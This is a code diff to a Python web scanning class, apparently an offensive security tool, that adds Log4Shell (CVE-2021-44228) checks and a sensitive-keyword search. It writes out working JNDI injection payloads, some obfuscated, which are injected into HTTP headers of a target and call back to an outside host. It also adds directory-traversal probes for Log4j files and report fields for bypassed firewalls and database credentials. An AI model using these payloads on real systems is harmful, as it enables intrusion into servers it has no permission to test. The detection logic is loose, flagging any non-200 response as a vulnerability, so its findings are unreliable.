@@ -329,38 +329,242 @@ class ZeroFramework:
                 continue
     
     def zero_day_detection(self):
-        """Basic framework for zero-day detection"""
-        print(f"{Colors.YELLOW}[*] Running zero-day vulnerability detection...{Colors.RESET}")
-        
-        # Check for common vulnerable components
-        components = [
-            'wp-content/', 'wp-includes/', 'administrator/',
-            'components/', 'modules/', 'plugins/', 'libraries/'
+        """Detect zero-day vulnerabilities including Log4Shell"""
+        print(f"{Colors.YELLOW}[*] Scanning for zero-day vulnerabilities including Log4Shell...{Colors.RESET}")
+
+        # Log4Shell specific detection
+        log4shell_payloads = [
+            '${jndi:ldap://',
+            '${jndi:rmi://',
+            '${jndi:dns://',
+            '${jndi:nis://',
+            '${jndi:nds://',
+            '${jndi:corba://',
+            '${jndi:iiop://',
+            '${${::-j}${::-n}${::-d}${::-i}:',
+            '${${::-l}${::-d}${::-a}${::-p}://',
+            '${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://'
         ]
+
+        # Log4j version indicators
+        log4j_indicators = [
+            'log4j-core-2.0',
+            'log4j-core-2.1',
+            'log4j-core-2.2',
+            'log4j-core-2.3',
+            'log4j-core-2.4',
+            'log4j-core-2.5',
+            'log4j-core-2.6',
+            'log4j-core-2.7',
+            'log4j-core-2.8',
+            'log4j-core-2.9',
+            'log4j-core-2.10',
+            'log4j-core-2.11',
+            'log4j-core-2.12',
+            'log4j-core-2.13',
+            'log4j-core-2.14',
+            'log4j-core-2.15',
+            'log4j-core-2.16',
+            'log4j-core-2.17',
+            'apache-log4j',
+            'log4j-api',
+            'log4j-core'
+        ]
+
+        # JNDI injection patterns
+        jndi_patterns = [
+            'jndi:ldap://',
+            'jndi:rmi://',
+            'jndi:dns://',
+            'jndi:nis://',
+            'jndi:nds://',
+            'jndi:corba://',
+            'jndi:iiop://',
+            'javax.naming.InitialContext',
+            'javax.naming.directory.InitialDirContext'
+        ]
+
+        try:
+            # Remote detection via HTTP headers and parameters
+            test_payloads = [
+                '${jndi:ldap://zero-security-scan.com/a}',
+                '${${::-j}${::-n}${::-d}${::-i}:ldap://zero-security-scan.com/a}',
+                '${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://zero-security-scan.com/a}'
+            ]
+
+            # Test common injection points
+            injection_points = [
+                {'name': 'User-Agent', 'value': test_payloads[0]},
+                {'name': 'X-Forwarded-For', 'value': test_payloads[1]},
+                {'name': 'Referer', 'value': test_payloads[2]},
+                {'name': 'X-Api-Version', 'value': test_payloads[0]}
+            ]
+
+            for point in injection_points:
+                headers = self.session.headers.copy()
+                headers[point['name']] = point['value']
+
+                try:
+                    response = self.session.get(self.target_url, headers=headers, timeout=5, verify=False)
+
+                    # Check for DNS callbacks or unusual responses
+                    if response.status_code != 200 or 'zero-security-scan' in response.text:
+                        self.vulnerabilities.append({
+                            'type': 'Log4Shell (CVE-2021-44228)',
+                            'description': f'Potential Log4Shell vulnerability detected via {point["name"]} header',
+                            'url': self.target_url,
+                            'severity': 'Critical',
+                            'cve': 'CVE-2021-44228',
+                            'payload_used': point['value']
+                        })
+
+                except:
+                    pass
+
+            # Static content analysis
+            response = self.session.get(self.target_url, headers=self.session.headers, timeout=10, verify=False)
+            content = response.text.lower()
+            headers_text = str(response.headers).lower()
+
+            # Check for vulnerable Log4j versions
+            for version in log4j_indicators:
+                if version.lower() in content or version.lower() in headers_text:
+                    self.vulnerabilities.append({
+                        'type': 'Log4Shell (Vulnerable Version)',
+                        'description': f'Potentially vulnerable Log4j version detected: {version}',
+                        'url': self.target_url,
+                        'severity': 'Critical',
+                        'cve': 'CVE-2021-44228'
+                    })
+
+            # Check for JNDI patterns in responses
+            for pattern in jndi_patterns:
+                if pattern.lower() in content:
+                    self.vulnerabilities.append({
+                        'type': 'JNDI Injection',
+                        'description': f'JNDI injection pattern detected: {pattern}',
+                        'url': self.target_url,
+                        'severity': 'High'
+                    })
+
+            # Check for Log4Shell payload echoes
+            for payload in log4shell_payloads:
+                if payload.lower() in content:
+                    self.vulnerabilities.append({
+                        'type': 'Log4Shell (Payload Echo)',
+                        'description': f'Log4Shell payload echoed in response: {payload}',
+                        'url': self.target_url,
+                        'severity': 'Critical',
+                        'cve': 'CVE-2021-44228'
+                    })
+
+        except Exception as e:
+            print(f"{Colors.RED}[-] Log4Shell detection failed: {e}{Colors.RESET}")
+
+        # Local file detection
+        self.scan_local_log4j_files()
+
+    def scan_local_log4j_files(self):
+        """Scan for local Log4j configuration and JAR files"""
+        print(f"{Colors.YELLOW}[*] Scanning for local Log4j files...{Colors.RESET}")
+
+        log4j_files = [
+            'log4j2.xml',
+            'log4j2.properties',
+            'log4j2.json',
+            'log4j2.yaml',
+            'log4j.properties',
+            'log4j.xml',
+            'log4j-core-2.*.jar',
+            'log4j-api-2.*.jar',
+            'apache-log4j-*-bin.jar'
+        ]
+
+        # Common Log4j paths
+        log4j_paths = [
+            '/',
+            '/var/log/',
+            '/opt/',
+            '/usr/local/',
+            '/home/*/',
+            '/app/',
+            '/webapp/',
+            '/WEB-INF/lib/',
+            '/lib/',
+            '/classes/'
+        ]
+
+        for log4j_file in log4j_files:
+            # Check if file exists via directory traversal
+            test_urls = [
+                f"{self.target_url}/{log4j_file}",
+                f"{self.target_url}/WEB-INF/{log4j_file}",
+                f"{self.target_url}/classes/{log4j_file}",
+                f"{self.target_url}/../{log4j_file}",
+                f"{self.target_url}/../../{log4j_file}"
+            ]
+
+            for test_url in test_urls:
+                try:
+                    response = self.session.head(test_url, timeout=5, verify=False)
+                    if response.status_code == 200:
+                        self.vulnerabilities.append({
+                            'type': 'Log4Shell (Local File Exposure)',
+                            'description': f'Log4j configuration file accessible: {log4j_file}',
+                            'url': test_url,
+                            'severity': 'Medium',
+                            'cve': 'CVE-2021-44228'
+                        })
+
+                except:
+                    continue
+
+    def scan_page_text_content(self):
+        """Scan page content for specific text patterns (intext search)"""
+        print(f"{Colors.YELLOW}[*] Scanning page text content for sensitive patterns...{Colors.RESET}")
+        text_findings = []
         
-        for component in components:
-            url = urljoin(self.target_url, component)
-            try:
-                response = self.session.get(url, timeout=5, verify=False)
-                if response.status_code == 200:
-                    # Basic version detection
-                    version_patterns = [
-                        r'version\s*["\']([\d.]+)["\']',
-                        r'Version\s*["\']([\d.]+)["\']',
-                        r'v([\d.]+)',
-                        r'([\d.]+)\s*version'
-                    ]
+        try:
+            # Common sensitive text patterns to search for
+            text_patterns = [
+                'password', 'username', 'secret', 'key', 'token',
+                'api_key', 'private', 'confidential', 'internal',
+                'admin', 'root', 'database', 'mysql', 'backup',
+                'ssh', 'ftp', 'login', 'auth', 'session'
+            ]
+            
+            response = self.session.get(self.target_url, timeout=10, verify=False)
+            content = response.text.lower()
+            
+            # Search for text patterns
+            for pattern in text_patterns:
+                if pattern in content:
+                    # Find context around the pattern
+                    start = max(0, content.find(pattern) - 50)
+                    end = min(len(content), content.find(pattern) + len(pattern) + 50)
+                    context = content[start:end].strip()
                     
-                    content = response.text
-                    for pattern in version_patterns:
-                        matches = re.findall(pattern, content, re.IGNORECASE)
-                        if matches:
-                            print(f"{Colors.YELLOW}[*] Found component: {component} (Version: {matches[0]}){Colors.RESET}")
-            except:
-                continue
+                    text_findings.append({
+                        'pattern': pattern,
+                        'context': context,
+                        'url': self.target_url,
+                        'severity': 'high' if pattern in ['password', 'api_key', 'secret'] else 'medium'
+                    })
+                    
+            if text_findings:
+                print(f"{Colors.GREEN}[+] Found {len(text_findings)} text-based findings{Colors.RESET}")
+                for finding in text_findings:
+                    print(f"  - Pattern '{finding['pattern']}' found at {finding['url']}")
+                    
+        except Exception as e:
+            print(f"{Colors.RED}[-] Error scanning text content: {e}{Colors.RESET}")
+            
+        return text_findings
     
     def generate_report(self):
         """Generate comprehensive security report"""
+        text_findings = getattr(self, 'text_findings', [])
+        
         report = {
             'target': self.target_url,
             'scan_date': datetime.now().isoformat(),
@@ -368,7 +572,9 @@ class ZeroFramework:
             'hidden_files': self.hidden_files,
             'database_credentials': self.db_credentials,
             'firewall_bypassed': self.firewall_bypassed,
-            'total_vulnerabilities': len(self.vulnerabilities)
+            'text_findings': text_findings,
+            'total_vulnerabilities': len(self.vulnerabilities),
+            'total_text_findings': len(text_findings)
         }
         
         # Save report to file
@@ -385,11 +591,19 @@ class ZeroFramework:
         print(f"Hidden Files Discovered: {len(self.hidden_files)}")
         print(f"Database Credentials Found: {len(self.db_credentials)}")
         print(f"Firewall Bypassed: {'Yes' if self.firewall_bypassed else 'No'}")
+        print(f"Text-based Findings: {len(text_findings)}")
         
         if self.vulnerabilities:
             print(f"\n{Colors.RED}Vulnerabilities Found:{Colors.RESET}")
             for vuln in self.vulnerabilities:
                 print(f"  - {vuln['type']} at {vuln['url']}")
+        
+        if text_findings:
+            print(f"\n{Colors.YELLOW}Text-based Findings (intext search):{Colors.RESET}")
+            for finding in text_findings[:5]:
+                print(f"  - Pattern '{finding['pattern']}' found: {finding['context'][:100]}...")
+            if len(text_findings) > 5:
+                print(f"  ... and {len(text_findings) - 5} more text findings")
         
         return report
     
@@ -406,6 +620,7 @@ class ZeroFramework:
         self.test_csrf_vulnerabilities()
         self.extract_database_info()
         self.zero_day_detection()
+        text_findings = self.scan_page_text_content()
         
         # Generate report
         return self.generate_report()
